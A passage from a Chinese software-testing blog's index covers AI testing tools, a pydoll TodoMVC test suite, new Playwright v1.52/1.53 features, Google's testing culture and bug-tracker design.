的并行测试机制，包括测试级并行、浏览器级并行和机器级并行的不同策略。作者通过具体的配置示例展示了如何设置并行度、如何处理共享资源的竞争问题、以及如何在并行环境下维护测试的稳定性。\n资源管理是并行测试的另一个重要话题。文章深入讨论了如何管理测试数据、如何处理数据库连接、如何避免端口冲突等实际问题。特别是在 Docker 环境下运行并行测试时，容器资源的分配和管理需要特殊考虑。\n文章还涵盖了测试结果的聚合和报告生成，包括如何在并行执行后合并测试报告、如何处理失败测试的重试机制、以及如何监控并行测试的性能指标。作者提供了完整的配置文件示例和最佳实践建议，帮助读者在实际项目中实施高效的并行测试策略。\nPactumJS 入门：项目结构和你的第一个测试用例 文章来源： https://noraweisser.com/2025/06/07/getting-started-with-pactumjs-project-structure-and-your-first-test-case\nPactumJS 作为一个新兴的 API 测试框架，以其简洁的语法和强大的功能吸引了越来越多的关注。这篇入门文章为初学者提供了完整的起步指南，从项目搭建到编写第一个测试用例。\n文章首先介绍了 PactumJS 的核心特性，包括对 REST API 和 GraphQL 的支持、内置的断言库、数据驱动测试支持、以及与主流测试运行器的集成能力。相比于其他 API 测试工具，PactumJS 在易用性和功能完整性之间找到了很好的平衡点。\n在项目结构方面，作者详细说明了如何组织测试文件、配置文件和测试数据。文章提供了一个标准的项目模板，包括测试环境配置、公共工具函数、测试数据管理等。这种结构化的方法有助于维护大型 API 测试套件。\n文章的核心部分是实际的测试用例编写。作者通过一个完整的示例展示了如何使用 PactumJS 进行 API 测试，包括请求构建、响应验证、错误处理等。特别值得注意的是，PactumJS 提供了丰富的断言方法和数据验证功能，能够满足复杂 API 测试的需求。\n最后，文章讨论了与 CI/CD 流程的集成，以及如何生成测试报告和监控 API 测试结果。\n从使用 Cursor 和 Windsurf 中学到的质量工程经验 文章来源： https://www.ministryoftesting.com/articles/lessons-in-quality-engineering-from-working-with-cursor-and-windsurf\nAI 驱动的开发工具正在改变软件开发的方式，但它们对代码质量的影响如何？z 作者过实际使用 Cursor 和 Windsurf 两款 智能编程 IDE 的经验，为我们提供了第一手的观察和分析。\n文章详细比较了这两款工具的特性和使用体验。Cursor 以其强大的代码补全和重构能力著称，而 Windsurf 则在代码审查和质量分析方面表现出色。作者通过实际的编码项目测试了这些工具在不同场景下的表现，包括新功能开发、Bug 修复、代码重构等。\n从质量工程的角度，文章重点分析了 AI 工具对代码质量的双重影响。积极方面包括：提高编码效率、减少低级错误、提供最佳实践建议、以及帮助开发者学习新技术。消极方面则包括：可能产生难以理解的代码、过度依赖可能降低开发者的思考能力、以及 AI 生成代码的质量不稳定性。\n作者特别强调了人工 review 在 AI 辅助开发中的重要性。即使有了强大的 AI 工具，人工的代码审查和质量把控仍然不可替代。文章提供了在使用 AI 工具时如何保持代码质量的具体建议，包括设置适当的提示词、建立代码 review 流程、以及持续监控代码质量指标。\n使用 Testcontainers 进行数据库 Python 单元测试 文章来源： https://medium.com/@gavinklfong/python-unit-test-on-database-with-testcontainers-315975f04df4\n数据库测试一直是单元测试中的一个难点，传统的 mock 方式往往无法完全模拟真实数据库的行为，而使用真实数据库又面临环境配置和数据隔离的挑战。Testcontainers 的出现为这个问题提供了优雅的解决方案。\n文章详细介绍了 Testcontainers 的工作原理：通过 Docker 容器技术，为每个测试提供独立的数据库实例。这种方法既保证了测试环境的一致性，又避免了测试之间的数据污染。同时，容器的快速启动和销毁特性使得测试执行效率得到了很好的保障。\n作者通过一个完整的 Python 项目示例展示了如何集成 Testcontainers。示例涵盖了项目配置、数据库初始化、测试数据准备、测试执行和清理等完整流程。特别值得注意的是，文章详细说明了如何处理数据库 schema 的创建和迁移、如何管理测试数据的生命周期、以及如何在 CI/CD 环境中运行这些测试。\n文章还讨论了性能优化的策略，包括容器复用、并行测试支持、以及资源限制配置等。这些优化措施对于大型项目的测试效率至关重要。\n视频资源 软件测试中的代理 AI：认识 TestZeus Hercules 视频来源： https://www.youtube.com/watch?v=uc6z8Uaqfw8\n这个 12 分钟的视频介绍了 TestZeus Hercules 这一开源的 AI 测试工具。\n作为 AI 驱动测试的最新发展，TestZeus Hercules 代表了测试自动化的新方向：从简单的脚本执行向智能决策转变。\n视频详细演示了 TestZeus Hercules 的核心功能，包括自动测试用例生成、智能测试执行、结果分析和报告生成等。特别令人印象深刻的是其自然语言交互能力，测试人员可以用日常语言描述测试需求，系统会自动生成相应的测试策略和执行计划。\n视频中分享了这个项目的技术架构和实现原理，包括如何集成多种 AI 技术（计算机视觉、自然语言处理、机器学习等）来实现 AI 自动化测试。\n视频还展示了实际的使用场景，从 Web 应用测试到移动应用测试，TestZeus Hercules 都展现出了良好的通用性。\n总结 期周刊突出了软件测试领域的几个重要趋势：\n文化转变的重要性 多篇文章强调，测试面临的真正挑战不在技术层面，而在于团队文化和思维模式的转变。从被动式测试向战略式测试思维的转变，以及获得团队对质量工作的认同，这些\u0026quot;软实力\u0026quot;比掌握新工具更为关键。\nAI 在测试中的深度应用 从 AI 辅助的测试标签建议到 TestZeus Hercules 等 AI 自动化测试框架。\n我们看到 AI 正在从辅助工具向自主决策方向发展。这种变化不仅提高了测试效率，更重要的是改变了测试工程师的工作方式。\n大规模质量管理的实践分享 Google 等大型企业的质量管理经验为我们提供了宝贵的参考。这些实践告诉我们，规模化的质量管理需要系统性的思考和长期的文化建设。\n工具生态的持续完善 从 Playwright 的并行测试到新的 API 验证工具，测试工具链正在变得更加成熟和专业化。这为测试工程师提供了更多选择，同时也要求我们具备更广泛的技术视野。\n","date":"2025-07-25T10:26:47+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A008-ai-%E5%9C%A8%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%9C%89%E6%B7%B1%E5%BA%A6%E7%9A%84%E5%BA%94%E7%94%A8%E4%BA%86/","title":"测试周刊008: AI 在测试中有深度的应用了?"},{"content":"2025 年已经过去一半了，这半年里，ai 与测试工具的结合有了不少进展。\n今天我们就一起来盘点一下。\n🔍 Shortest 一个零配置的工具，只需指向你的网站或应用，AI 便可自动生成并执行测试。非常适合需要快速反馈循环而不依赖繁琐脚本的场景。\n项目地址: https://github.com/antiwork/shortest\n🧪 主要特性 基于自然语言的端到端（E2E）测试框架 使用 Anthropic Claude API 进行 AI 驱动的测试执行 构建于 Playwright 之上 支持 GitHub 集成，并兼容 两步身份验证（2FA） 通过 Mailosaur 实现邮件验证功能 Your browser does not support the video tag. 🧪 TestZeus Hercules 一个由大型语言模型（LLM）驱动的框架，旨在自动生成和执行测试用例。面向企业级使用场景，能很好地集成到 CI/CD 流程中。\n项目地址: https://github.com/test-zeus-ai/testzeus-hercules\n🎥 MidScene 利用 AI 录制并重播用户流程，并生成自然语言描述。它弥合了业务级需求与测试脚本之间的鸿沟。\n项目地址: https://github.com/web-infra-dev/midscene/blob/main/README.zh.md\n主要特性 用自然语言编写自动化脚本 描述你的目标和步骤，Midscene 会为你规划和操作用户界面。 使用 Javascript SDK 或 YAML 格式编写自动化脚本。 Web \u0026amp; Mobile App Web 自动化 🖥️: 可以与 Puppeteer 集成，与 Playwright 集成或使用桥接模式来控制桌面浏览器。 Android 自动化 📱: 使用 Javascript SDK 配合 adb 来控制本地 Android 设备。 工具 用于调试的可视化报告 🎞️: 通过我们的测试报告和 Playground，你可以轻松理解、回放和调试整个过程。 使用缓存，提高执行效率 🔄: 使用缓存能力重放脚本，提高执行效率。 MCP 🔗: 允许其他 MCP Client 直接使用 Midscene 的能力。 三种类型的 API 交互 API 🔗: 与用户界面交互。 数据提取 API 🔗: 从用户界面和 DOM 中提取数据。 实用 API 🔗: 实用函数，如 aiAssert() （断言）, aiLocate() （定位）, aiWaitFor() （等待）。 🤖 Giskard 为机器学习模型提供 AI 质量保障框架，支持测试、验证与监控。不仅仅是功能性测试，还涵盖偏差检测、模型漂移以及稳健性分析。\n项目地址: https://github.com/Giskard-AI/giskard\n简单来说这是用来评估大模型质量的。\n可以检测下面的问题\n幻觉 生成有害内容 提示注入 健壮性问题 敏感信息披露 刻板印象与歧视 以及更多…… 🔐 PentestGPT 将渗透测试技术与 GPT-4 能力结合，自动化安全测试流程中的部分环节。非常适合增强手动安全测试的效率。\n项目地址: https://github.com/GreyDGL/PentestGPT\n这是做渗透测试的。\n🧭 Zerostep 一款用于 Playwright 的 AI 插件，支持用自然语言编写端到端测试。无需选择器，AI 可自动识别 UI 操作和验证步骤。\n项目地址: https://zerostep.com/\n可以看一下代码，还是有点意思的，基本上就是用自然语言来描述用例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import { test, expect } from \u0026#34;@playwright/test\u0026#34;; import { ai } from \u0026#34;@zerostep/playwright\u0026#34;; test.describe(\u0026#34;Calendly\u0026#34;, () =\u0026gt; { test(\u0026#34;book the next available timeslot\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;https://calendly.com/zerostep-test/test-calendly\u0026#34;); await ai(\u0026#34;Verify that a calendar is displayed\u0026#34;, { page, test }); await ai(\u0026#34;Dismiss the privacy modal\u0026#34;, { page, test }); await ai(\u0026#34;Click on the first day in the month with times available\u0026#34;, { page, test, }); await ai(\u0026#34;Click on the first available time in the sidebar\u0026#34;, { page, test, }); await ai(\u0026#34;Click the Next button\u0026#34;, { page, test }); await ai(\u0026#34;Fill out the form with realistic values\u0026#34;, { page, test }); await ai(\u0026#34;Submit the form\u0026#34;, { page, test }); const element = await page.getByText(\u0026#34;You are scheduled\u0026#34;); expect(element).toBeDefined(); }); }); 🧠 更多推荐 Goose (Block) — 一个由 AI 驱动的开发助手，可以通过自然语言提示生成项目结构、编写测试并进行调试 Airtap — 一个灵活的 JavaScript 测试运行器，支持在真实浏览器中运行 TAP 测试，适合 Web QA SQLMap-AI — 用 AI 驱动传统 SQL 注入测试，提供自动化与自适应流程控制 总结 人工智能（AI）在软件测试领域的应用已成为行业发展的主流趋势。随着 AI 模型能力的不断提升以及 Agent 模式的广泛应用，高效且精准的自动化测试时代正在加速到来。AI 技术通过自动生成测试用例、优化测试套件以及实现自愈测试脚本，正在显著提升测试效率并降低人工干预的需求。\n近期，微软宣布了大规模裁员计划，据报道涉及约 9000 名员工，裁员主要集中在软件工程和项目管理等技术岗位。 虽然微软强调裁员是为了优化组织结构和减少管理层级，但其首席执行官 Satya Nadella 曾表示，公司部分项目的代码已有高达 30%由 AI 生成，这引发了外界对 AI 取代部分技术岗位的担忧。 尽管没有直接证据表明微软明确声明“不会使用 AI 的程序员将被淘汰”，但行业趋势显示，熟练掌握 AI 工具已成为程序员和测试人员保持竞争力的关键。\n未来，随着 AI 驱动的开发效率提升，传统上由专门测试人员完成的验证工作可能会逐步转移至代码的开发者，形成“谁开发，谁测试”的模式。生成式 AI 和测试影响分析等技术的进步使得开发者能够更高效地验证代码更改，从而可能减少对初级测试人员的需求。 与此同时，无代码测试自动化工具的兴起进一步降低了传统编程技能在测试领域的需求，而对具备 AI 应用能力、批判性思维以及复杂系统测试技能的高级测试人员的需求正在增加。\n因此，测试人员需要积极适应 AI 技术，掌握相关工具和方法，以在快速变化的行业环境中保持不可替代性。对于企业和从业者而言，拥抱 AI 不仅是提升效率的机遇，也是应对未来挑战的必然选择\n","date":"2025-07-03T16:26:47+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A007-ai-%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B72025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E7%9B%98%E7%82%B9/","title":"测试周刊007: AI 测试工具2025上半年盘点"},{"content":"在一个已有开发节奏的团队中，作为第一位测试人员去推行新流程，绝非易事。\n你会被开发质疑：是不是要拖慢上线进度？是不是要卡死流程，让整个开发团队都不爽？\n这些成见不是你的错，但你必须面对它们。\npydoll 初体验 之前介绍过一款新的 ui 自动化测试工具\u0026mdash;-pydoll。\n今天抽空在 github 的 copilot 的帮助下试用了一下。\n我用 pydoll 实现了一个测试任务列表的测试套件，包含 5 个测试用例。\n具体用例如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 import asyncio import os import unittest from pydoll.browser.chromium import Chrome from pydoll.browser.options import ChromiumOptions from pydoll.constants import Key class TestTodoMVC(unittest.IsolatedAsyncioTestCase): async def asyncSetUp(self): options = ChromiumOptions() options.add_argument(\u0026#39;--start-maximized\u0026#39;) options.add_argument(\u0026#39;--disable-notifications\u0026#39;) self.browser = Chrome(options=options) self.tab = await self.browser.start() await self.tab.go_to(\u0026#39;https://todomvc.com/examples/react/dist/\u0026#39;) async def asyncTearDown(self): await self.browser.__aexit__(None, None, None) async def test_add_todo(self): new_todo = await self.tab.find(class_name=\u0026#39;new-todo\u0026#39;, timeout=5, raise_exc=True) await new_todo.type_text(\u0026#34;Install pydoll\u0026#34;) await asyncio.sleep(1) await new_todo.press_keyboard_key(Key.ENTER) todo_items = await self.tab.find(class_name = \u0026#39;view\u0026#39;, timeout=5, find_all=True, raise_exc=True) found = False texts = [] for item in todo_items: text = await item.text texts.append(text) if \u0026#34;Install pydoll\u0026#34; in text: found = True break self.assertTrue(found) async def test_complete_todo(self): await self.test_add_todo() toggle = await self.tab.find(class_name=\u0026#34;toggle\u0026#34;, timeout=5, raise_exc=True) await toggle.click() completed = await self.tab.find(class_name=\u0026#39;completed\u0026#39;, timeout=5, raise_exc=True) self.assertIsNotNone(completed) async def test_delete_todo(self): await self.test_add_todo() todo_item = await self.tab.find(class_name=\u0026#39;view\u0026#39;, timeout=5, raise_exc=True) await todo_item.click() destroy_btn = await todo_item.find(class_name=\u0026#39;destroy\u0026#39;, timeout=5, raise_exc=True) await destroy_btn.click() todo_items = await self.tab.find(class_name=\u0026#39;view\u0026#39;, find_all=True) found = False for item in todo_items: if \u0026#34;Install pydoll\u0026#34; in item.text: found = True break self.assertFalse(found) async def test_filter_todo(self): await self.test_add_todo() toggle = await self.tab.find(class_name=\u0026#34;toggle\u0026#34;, timeout=5, raise_exc=True) await toggle.click() active_filter = await self.tab.find(text=\u0026#34;Active\u0026#34;, timeout=5, raise_exc=True) await active_filter.click() await asyncio.sleep(1) active_items = [item for item in await self.tab.find(class_name = \u0026#39;view\u0026#39;, find_all=True)] self.assertEqual(len(active_items), 0) completed_filter = await self.tab.find(text=\u0026#34;Completed\u0026#34;, timeout=5, raise_exc=True) await completed_filter.click() await asyncio.sleep(1) completed_items = await self.tab.find(class_name = \u0026#39;view\u0026#39;, find_all=True) found = False for item in completed_items: title = await item.text if \u0026#34;Install pydoll\u0026#34; in title: found = True break self.assertTrue(found) async def test_screenshot(self): await self.test_add_todo() screenshot_path = os.path.join(os.getcwd(), \u0026#39;pydoll_repo.png\u0026#39;) await self.tab.take_screenshot(path=screenshot_path) self.assertTrue(os.path.exists(screenshot_path)) if __name__ == \u0026#34;__main__\u0026#34;: unittest.main() 上面的代码实现了\n创建 1 条任务 完成 1 条任务 删除新创建的任务 任务列表过滤 截图 这 5 条用例。\n具体感受 pydoll 在交互上有一定的问题，比如\n没有 hover() 方法，上面删除任务的用例里需要鼠标悬停到任务实例上，等删除按钮出现的时候再去点击。因为 pydoll 没有提供 hover 方法，我就只能用 click 来代替了。在使用click之前，我是试着用 javascript 去模拟 hover，但是没有效果，这里其实浪费了 20 分钟以上的； 没有 double click 方法，所以双击编辑任务的测试用例就没有实现了； 前端交互稍微复杂一点就不行了。\n另外用 query 方法去定位一组元素似乎用不起来，因为混合着异步的关系，所以到底为什么定位不到，具体原因还是不清楚。\n总结 pydoll 目前提供的交互形的 api 还是有较大的提升空间的。\n如果你的被测项目前端交互比较丰富，比如需要大量的鼠标悬停，拖拽等操作的话，pydoll 应该可以处理，但可能会用到大量的原生 javascript 代码，有点绕路了，不推荐。\n从目前情况看，用 pydoll 来实现数据爬虫可能会比较现实一点。\ncopilot 进行 ui 自动化用例编写的感受 之前的项目里用到过 copilot 来进行单元测试用例的生成，在批量实现 fixture 数据上面，ai 对于编码的效率提升是极其巨大的。\n这次试试用 copilot 来实现自动化测试用例，而且用的是比较新的工具\u0026ndash;pydoll，copilot 的一些局限性就表现出来了。\n问题 1:幻觉严重 可能是因为 pydoll 是比较新的库吧，copilot 在进行代码生成时出现了比较严重的幻觉。\n比如 pydoll 没有find_elements方法，但 copilot 一直坚持用这个不存在的方法来定位元素。\n所以在用 copilot 写代码时，最好是写成熟框架的代码。\n大部分人类都不熟悉的领域，ai 自然也不会有太深的造诣。\n问题 2:异步和同步分不清楚 我发现 copilot 生成的代码，有一种把大部分语句都当作异步代码来实现的倾向。\n比如在遍历一组定位到的元素时，copilot 建议使用async for，而一些同步方法，copilot 也喜欢在前面加await。\n这应该是 pydoll 比较新的缘故的，在 playwright 的异步调用代码生成方面，copilot 的准确率应该会高一些。\n问题 3:分析不出来具体的问题 在调试代码的过程中，我尝试把报错信息扔给 copilot 进行分析，并给出修改后的代码。\n不过在几个回合内，copilot 给出的解决方案不仅包含幻觉（比如调用不存在的方法），而且在我人工修正幻觉后，copilot 的建议也不能解决报错的问题。\n后来是我自己根据经验进行调试，才让测试用例顺利跑通。\n感觉是 copilot 并没有分析出用例无法执行的根本原因，所以给出的修复方案并不能对症下药。\ncopilot 有时候很努力，但有可能解决不了根本的问题。\n也可能是我自己耐心不足，没准多尝试几轮，copilot 就会给出正确的解法了。\nPlaywright v1.52 和 v1.53 有哪些新功能 🧠 VS Code 中的 AI 自动修复功能 我们在调试用例的时候，用例运行失败是家常便饭了。\n根据我自己的经验，ui 自动化测试 60%以上的时间都花在了调试上。\n为什么定位不到元素呢？\n为什么获取不到属性呢？\n为什么点击没有效果呢？\n每日三省吾身。\n现在使用 playwright 时， 当测试失败，只需点击错误信息旁边的 ✨ 图标，或在测试资源管理器中悬停测试名称时点击图标。\nPlaywright 会将足够的上下文信息提供给 Copilot，Copilot 会生成有针对性的修复建议。你可以查看、接受并重新运行，整个流程快速、高效，而且非常实用。\n想尝试这个功能？确保你已经安装并启用了 Playwright 的 VS Code 插件。\n🔎 locator.describe()：增强 Trace 和报告可读性 一般情况下，在不使用 po 的前提下，ui 自动化测试的代码的可读性是不够好的。\n很多时候，代码里会充斥着各种看不懂的 css 选择器或 xpath 表达式。\n现在你可以通过 .describe() 为任何定位器添加更具可读性的描述：\n1 2 3 4 const newTodo = page .getByPlaceholder(\u0026#34;What needs to be done?\u0026#34;) .describe(\u0026#34;新待办输入框\u0026#34;); await newTodo.fill(\u0026#34;买牛奶\u0026#34;); 这些描述会出现在：\nTrace Viewer 中 UI 模式下 HTML 测试报告中 这一小改动在调试复杂 UI 或团队协作时可以带来巨大的帮助。\n📊 HTML 报告支持自定义标题 你可以为测试报告添加更清晰的标题，配置如下：\n1 2 3 4 5 import { defineConfig } from \u0026#34;@playwright/test\u0026#34;; export default defineConfig({ reporter: [[\u0026#34;html\u0026#34;, { title: \u0026#34;自定义测试运行 #1028\u0026#34; }]], }); 非常适合用于团队仪表板、CI 输出，或用于区分多轮测试的运行记录。\n✅ 新增断言：toContainClass 有时候我们是需要断言某个元素是否包含特定的 class 的。\n比如有个元素被禁用了，那么class里就可能会包含disabled这个值。\n之前 playwright 是没有特定的断言来开箱即用的。\n不过现在有了：\n1 2 3 await expect(page.getByRole(\u0026#34;listitem\u0026#34;, { name: \u0026#34;Ship v1.52\u0026#34; })).toContainClass( \u0026#34;done\u0026#34; ); 这种方式语法简洁、表达精准，尤其适用于基于 class 的 UI 状态检查。\n🧪 快照增强：支持 children 和 url ARIA 快照（通过 toMatchAriaSnapshot）现在支持：\n/children: equal —— 确保子元素被包含在快照中 /url: \u0026quot;https://playwright.dev\u0026quot; —— 匹配特定 URL 示例：\n1 2 3 4 5 6 7 8 await expect(locator).toMatchAriaSnapshot(` - list - /children: equal - listitem: Feature A - listitem: - link \u0026#34;Feature B\u0026#34;: - /url: \u0026#34;https://playwright.dev\u0026#34; `); 这让 UI 快照测试在处理复杂或动态组件时更加可靠。\n⚙ test runner 更新 新增了以下快捷功能：\ntestProject.workers —— 每个测试项目可自定义并发数 failOnFlaky —— 一旦检测到测试不稳定，可自动判定为失败 🆙 如何升级？ 安装最新版本：\n1 npm i -D @playwright/test@latest 同时别忘了将 VS Code 插件更新到最新版本，以便启用 AI 修复等新功能。\n言论 我不确定“测试债务（Testing Debt）”这个术语在行业中是否被广泛使用！\n但在我的实践中，我已经使用“测试债务”这个术语有 9 年了。\n我用它来向相关干系人传达和持续提醒我们因为技术债务而不得不进行的返工工作。\n在理解“技术债务”含义的基础上，我们是否可以类比出什么是“测试债务”呢？\n大多数时候，系统的可测试性（testability）、可自动化性（automatability）和可观测性（observability）都会因为技术债务而受到影响。\n而这种影响一旦发生，就会进一步引发测试债务，形成连锁效应。\n测试债务的一个主要影响是：原本测试中植入的确定性能力（Deterministic capability 被改变。\n而要对这种确定性能力进行返工，在很多情况下并不简单，尤其当业务操作、技术层或基础设施发生了变更时更是如此。\n当我说“我们正在做的事情和交付的内容带来了技术债务”，这也意味着，“由此也产生了相应的测试债务”。\n从工程的角度看，测试本身就是技术活动的一部分。\n所以当有人把测试团队描述为“非技术”，甚至贴上某些标签时，我总觉得有些好笑。\n比如，常听到的标签是“手动的”、“可重复的”、“重复性高的”等等。\n但其实，测试的“重复性”恰恰就是工程周期和流程的一部分——它有其存在的意义和价值。\n\u0026ndash;@Ravisuriya Eswara\n","date":"2025-06-26T16:26:47+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A006-playwrightv1.53%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BD/","title":"测试周刊006: playwrightv1.53的新功能"},{"content":"在 Google 早期，测试并不是首要任务。公司文化高度依赖工程师的才华——聪明的人写聪明的代码。大多数情况下，这种方式都很有效。少数系统部署了集成测试，但广泛的、结构化的测试极其罕见。这就像软件开发的\u0026quot;狂野西部\u0026quot;时代。\nGoogle 的测试文化：从危机到规模化的演进之路 Google Web Server (GWS) 的觉醒时刻 在 Google 早期，测试并不是首要任务。公司文化高度依赖工程师的才华——聪明的人写聪明的代码。大多数情况下，这种方式都很有效。少数系统部署了集成测试，但广泛的、结构化的测试极其罕见。这就像软件开发的\u0026quot;狂野西部\u0026quot;时代。\n但在做 Google Web Server (GWS) 这个系统时，上面的方法就玩不转了。\n这是 google 搜索的核心服务，处理每个用户查询并实时返回结果。简而言之，它对 Google 的重要性就像水之于鱼一样——是绝对不可或缺。\n到 2005 年，GWS 的复杂性急剧膨胀。随着系统规模增长，开发效率直线下降。发布周期变慢，bug 频繁进入生产环境。开发人员开始对自己的代码修改失去信心。曾经有一段时间，超过 80%的生产部署因为产生了影响用户的 bug 而被迫回滚。\n这成为了一个关键转折点。\n为了扭转局面，GWS 技术负责人做出了大胆决定：每段新代码都必须配备自动化测试，并且这些测试要持续运行。这标志着 google 测试文化的转变——从被动救火转向主动的、工程师主导的质量保障。\n在快速变化的世界中测试 现代软件开发与光盘包装软件的时代截然不同。如今，应用程序更新频繁——有时一天多次。每次发布的背后都有一个极其复杂的代码库。\n在 Google，即使是一个\u0026quot;简单\u0026quot;的服务也可能包含数百万行代码，依赖数百个库，为数十个平台的用户提供服务——每个平台都有无数种硬件、操作系统和网络配置组合。手动测试根本无法应对这种规模。\n以 Google 搜索为例。完全手工测试意味着要验证从网页结果到电影信息、航班搜索、图片搜索等所有功能。这个工作量需要在每个国家、每种语言、每种设备上重复执行——同时还要确保符合无碍访问标准和安全最佳实践。\n在这种规模、速度和复杂性下，唯一可行的测试方法就是自动化。\n向工程师驱动的自动化测试转变 从 GWS 的必要修复开始，这逐渐演变成 Google 的基本原则：测试不是开发的一个阶段，而是工程工作的内在组成部分。自动化测试嵌入到开发工作流中，确保快速迭代不会牺牲可靠性。\n这种方法不仅仅是为了捕获 bug——更重要的是建立信心。通过持续运行测试，工程师可以快速行动而无需担忧。新功能发布更快，质量保持高水准，用户体验良好。\n编写、运行、响应：Google 测试哲学的核心 现代软件测试的核心是一个看似简单的循环：编写测试、运行测试、响应失败。\n憋大招然后统一手工测试的时代已经过去了。今天，构建系统的工程师同时也负责系统的质量。编写测试不再是其他人的工作——它是软件开发的基本组成部分。即使在拥有专门测试团队的组织中，开发人员编写的测试仍然是质量保障的基石。\n这种方法不仅在理念上正确，在实践中也是必需的。面对现代软件开发的速度和复杂性，没有其他方法能够跟得上。在整个工程组织中分担编写和维护测试的责任，确保测试能力与代码规模同步增长。\n但编写和运行测试只是整个体系的一部分。自动化的真正威力体现在团队主动响应由于测试问题造成的构建失败。在大型、快速迭代的系统中，测试失败不可避免。测试策略是否有效，取决于团队处理这些失败的速度和认真程度。\n让失败的测试长期存在，会快速降低信心并导致测试结果被忽视。但当团队能在几分钟内修复失败时，他们能更快地定位问题，维持对测试套件的高度信任，最终交付更好、更安全的代码。\n在 Google，这种理念深入人心：将每次测试失败视为改进系统的机会，并立即采取行动。这个反馈循环——编写、运行、响应——使得工程速度能够与全球规模的软件可靠性并存。\n长期收益：测试代码的益处 自动化测试不仅仅是工具——它是构建具有韧性、可维护性和快速迭代能力的软件系统的策略。在 Google，早期投入编写测试在项目的整个生命周期中都会产生回报：\n1. 减少调试，专注构建 经过充分测试的代码进入系统时 bug 更少——并且能保持这种状态。大多数缺陷在代码提交前就被捕获，节省了大量后续调试时间。\n在 Google，代码不是静态的。单个组件在其生命周期中可能被修改数十次，通常由其他团队甚至自动化系统完成。没有强大的测试套件，每次变更都会带来风险。但有了测试保护，它们就像安全网一样发挥作用。如果新的变更——甚至是依赖项的变更——破坏了功能，测试基础设施会立即捕获并标记。很多情况下，有问题的变更在到达生产环境前就会被自动回滚。\n2. 增强对代码变更的信心 软件中变化是常态。但有了可靠的测试覆盖，团队可以自信地调整和演进系统。每个关键行为都被持续验证，支持安全的迭代开发。\n这在重构时特别有用。如果变更保持了行为不变，现有测试就不需要修改——这清楚地表明重构是正确的。这种清晰性鼓励团队定期改进代码结构，而不用担心破坏功能。\n3. 可执行的文档 传统文档往往不可靠——经常过时、模糊或不完整。但清晰、专注的测试可以作为活跃的、可执行的文档形式。\n每个测试都解释了系统在特定情况下的行为。想了解代码对某个输入应该如何响应？直接看测试用例就可以了。如果需求变更破坏了现有测试，你会立即得到明显的信号，提醒测试代码需要更新。\n但是，测试用例只有在保持清晰、简洁和目标明确时才能很好地充当文档。良好的测试规范是必不可少的。\n4. 简化代码审查 在 Google，所有代码提交前都需要至少一次同行审查。但当代码变更配有可靠的测试时，审查过程会更顺畅、更快速。\n审查者无需在脑海中跟踪每个边界情况的执行路径，他们可以直接看到测试结果。测试展示了正确性，处理了边界情况，并验证了失败模式。这让审查者能够专注于设计和清晰性，而不仅仅是正确性。\n5. 通过可测试性改善设计 编写测试迫使开发人员思考代码将如何被使用和维护。如果代码难以测试，通常是因为它承担了太多职责、耦合过于紧密，或者将逻辑隐藏在复杂的依赖关系后面。\n可测试的代码通常就是设计良好的代码：模块化、专注且易于维护。当你因为测试暴露了设计问题而在早期修复它们时，你为自己节省了后续的重构工作和复杂性。\n6. 更快、更高质量的发布 在 Google，许多拥有数百名工程师的大型项目每天都向生产环境发布新版本。这种速度只有通过强大的测试套件才能实现。\n自动化测试通过早期捕获回归问题和持续验证正确性，实现了快速、安全的部署。团队能够快速行动不是因为他们跳过了测试——而是因为他们在每个步骤都自动化了测试。\n最终思考 Google 规模化的自动化测试不仅仅是大力出奇迹——它关乎智能基础设施、文化纪律以及对工程卓越的深度承诺。\nBug 管理系统该如何设计 上周看到了科技爱好者周刊讨论了这个问题，觉得深有启发。\nbugzilla 的一个早期工程师，前不久写了一篇文章，介绍 Bugzilla 的四条设计原则。\n他说，只有满足这四点，才是一个好的 Bug 追踪系统（bug tracking system），我感到很有启发。\n（1）所有任务都要列入 Bug 追踪。不仅包括代码 Bug，还包括待开发的新功能、缺失的文档、令人困惑的用户体验、糟糕的性能等等。\n换言之，Bug 追踪系统本质是任务管理，应该当作项目管理系统来用。\n（2）Bug 的状态有多种，不只\u0026quot;打开\u0026quot;和\u0026quot;关闭\u0026quot;两种。\n大公司的 Bug 处理流程，可能很复杂，下面是一张从 Bugzilla 文档拷贝的流程图。\nBug 追踪系统应该足够灵活，可以自定义优先级、严重程度、是否已分配、是否有依赖等等，以便适配各种流程。\n（3）每个 Bug 只能由一人负责。\n这样才能明确责任，方便查看每个人正在做什么、接下来要做什么、以及最近做了什么。这也有利于培养开发者的归属感和成就感。\n（4）支持自定义视图。\n由于 Bug 有多种状态，追踪系统必须支持自定义视图查看，拥有强大的查询功能。\n系统的默认视图：按照优先级，列出当前版本的所有没有关闭的 Bug。\n开发者的个人视图：列出分配给他们的所有 Bug，同样按优先级排序。另外，用户可以保存自己的自定义视图。\n个人感受 基本上我使用过的大部分 bug 管理系统都满足上面要求。\n不过目前就职的公司由于很多非常复杂的原因，我们并没有统一使用缺陷管理系统。\n取而代之的是，我们用的是飞书的多维表格来管理缺陷。\n如果配置得当的话，多维表格是满足上面的 4 个要求的，凑合拿来用还是没有问题的。\n但是多维表格也有不少局限性，比如\n缺陷分析能力有限，本质上讲根本就没有这个功能； 长期维护的项目，缺陷记录数量会非常多，从而导致系统性能下降 状态流转没有状态机保障，字段之间没有联动 常用图表需要自己配置，很难在多个项目中共享一套配置 所以在有条件的情况下，还是使用缺陷管理系统吧，这个对缺陷的跟踪以及工作效率的提升都有正向的收益。\npydoll 最方便使用的自动化测试工具 在使用 selenium 的时候，有个比较大的痛点是随着本机安装的浏览器的更新，各种驱动，比如 chromedriver 